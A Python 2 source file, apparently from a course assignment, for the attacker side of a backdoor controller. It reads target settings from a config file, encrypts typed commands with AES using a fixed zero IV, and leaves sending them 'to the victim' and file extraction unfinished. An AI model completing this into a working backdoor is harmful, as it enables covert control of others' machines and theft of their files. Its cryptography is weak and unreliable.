#server / attacker
import ConfigParser, threading, hashlib, sys, os
#from Crypto import Random
from Crypto.Cipher import AES

configParser = ConfigParser.RawConfigParser()
configFilePath = r'config.txt'
configParser.read(configFilePath)

dstIP = configParser.get('config', 'dstIP')
srcIP = configParser.get('config', 'srcIP')
dstPort = configParser.get('config', 'dstPort')
fileDir = configParser.get('config', 'fileDir')
key = configParser.get('config', 'password')
print dstIP

#----------------------------------------------------------------------
#-- FUNCTION: checkRoot()
#--
#-- NOTE:
#-- Check the uid running the application. If its not root, then exit.
#----------------------------------------------------------------------
def checkRoot():
	if(os.getegid() != 0):
		sys.exit("The program must be run with root")



#Using encryption code from backdoor assignment

IV = 16 * '\x00'#16 is block size

#convert the password to a 32-byte key using the SHA-256 algorithm
def getKey():
	global key
	return hashlib.sha256(key).digest()


# decrypt using the CFB mode (cipher feedback)
def decrypt(text):
	global IV
	key = getKey()
	decipher = AES.new(key, AES.MODE_CFB, IV)
	plaintext = decipher.decrypt(text)
	return plaintext

#encrypt using the CFB mode (cipher feedback)
def encrypt(text):
	key = getKey()
	global IV
	cipher = AES.new(key, AES.MODE_CFB, IV)
	ciphertext = cipher.encrypt(text)
	return ciphertext

def badDecrypt(text):
	global IV
	key = "Password"
	bkey = hashlib.sha256(key).digest()
	decipher = AES.new(bkey, AES.MODE_CFB, IV)
	plaintext = decipher.decrypt(text)
	return plaintext





def getCmd(dstIP, srcIP, dstPort):
	while True: 
		cmd = raw_input("Enter a command: ")

		if cmd =="exit":
			print "Exiting"
			sys.exit()


		elif cmd =="close":
			#drop iptables rule
			print "Closing port"

		else :
			encryptedCmd=encrypt(cmd)
			print "Command: " + cmd
			print "Encrypted command: "+ encryptedCmd
			print "Decypted command with wrong password: "+badDecrypt(encryptedCmd)
			print "Decrypted command with correct password: "+decrypt(encryptedCmd)
			#encrypt the command
			#create a packet to send to the victim
			










#2 main threads. User commands & file extraction
def main():
	checkRoot()

	cmdThread = threading.Thread(target=getCmd, args=(dstIP, srcIP, dstPort))
	#fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
	
	cmdThread.start()
	#fileThread.start()

if __name__== '__main__':
	main()